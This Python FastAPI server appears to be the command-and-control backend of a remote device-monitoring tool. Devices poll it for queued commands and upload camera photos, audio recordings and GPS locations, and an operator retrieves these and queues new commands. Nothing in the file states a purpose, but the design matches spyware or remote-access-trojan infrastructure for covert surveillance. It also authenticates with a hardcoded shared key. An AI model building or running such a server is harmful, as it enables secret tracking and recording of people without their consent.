from fastapi import FastAPI, Request, HTTPException, UploadFile, File
import time

app = FastAPI()
API_KEY = "MY_SECRET_KEY_123" 

device_data = {} 
command_queue = []
latest_image_bytes = None
latest_audio_bytes = None
latest_location = "No location yet"
debug_msg = "No debug info"

def check_key(request: Request):
    if request.headers.get("X-Key") != API_KEY:
        raise HTTPException(status_code=401, detail="Unauthorized")

@app.post("/cmd")
async def get_commands(request: Request):
    check_key(request)
    data = await request.json()
    device_id = data.get("device_id")
    data["last_seen"] = time.time()
    device_data[device_id] = data
    cmds = list(command_queue)
    command_queue.clear()
    return {"commands": cmds}

@app.post("/upload_photo")
async def upload_photo(request: Request, file: UploadFile = File(...)):
    global latest_image_bytes
    check_key(request)
    latest_image_bytes = await file.read()
    return {"status": "ok"}

@app.post("/upload_audio")
async def upload_audio(request: Request, file: UploadFile = File(...)):
    global latest_audio_bytes
    check_key(request)
    latest_audio_bytes = await file.read()
    print("Audio received!")
    return {"status": "ok"}

@app.post("/location")
async def post_location(request: Request):
    global latest_location
    check_key(request)
    data = await request.json()
    latest_location = f"Lat: {data.get('lat')}, Lon: {data.get('lon')}"
    return {"status": "ok"}

@app.post("/result")
async def post_result(request: Request):
    global debug_msg
    check_key(request)
    data = await request.json()
    if "debug_text" in data:
        debug_msg = data["debug_text"]
    return {"status": "ok"}

@app.get("/state")
async def get_state(request: Request):
    check_key(request)
    now = time.time()
    active_devices = {k: v for k, v in device_data.items() if now - v.get("last_seen", 0) < 15}
    return {
        "devices": active_devices, 
        "has_image": latest_image_bytes is not None, 
        "has_audio": latest_audio_bytes is not None,
        "location": latest_location,
        "debug_msg": debug_msg
    }

@app.get("/get_photo")
async def get_photo(request: Request):
    check_key(request)
    from fastapi.responses import Response
    return Response(content=latest_image_bytes, media_type="image/jpeg")

@app.get("/get_audio")
async def get_audio(request: Request):
    check_key(request)
    from fastapi.responses import Response
    return Response(content=latest_audio_bytes, media_type="audio/mp4")

@app.post("/queue_cmd")
async def queue_command(request: Request):
    check_key(request)
    cmd = await request.json()
    command_queue.append(cmd)
    return {"status": "queued"}
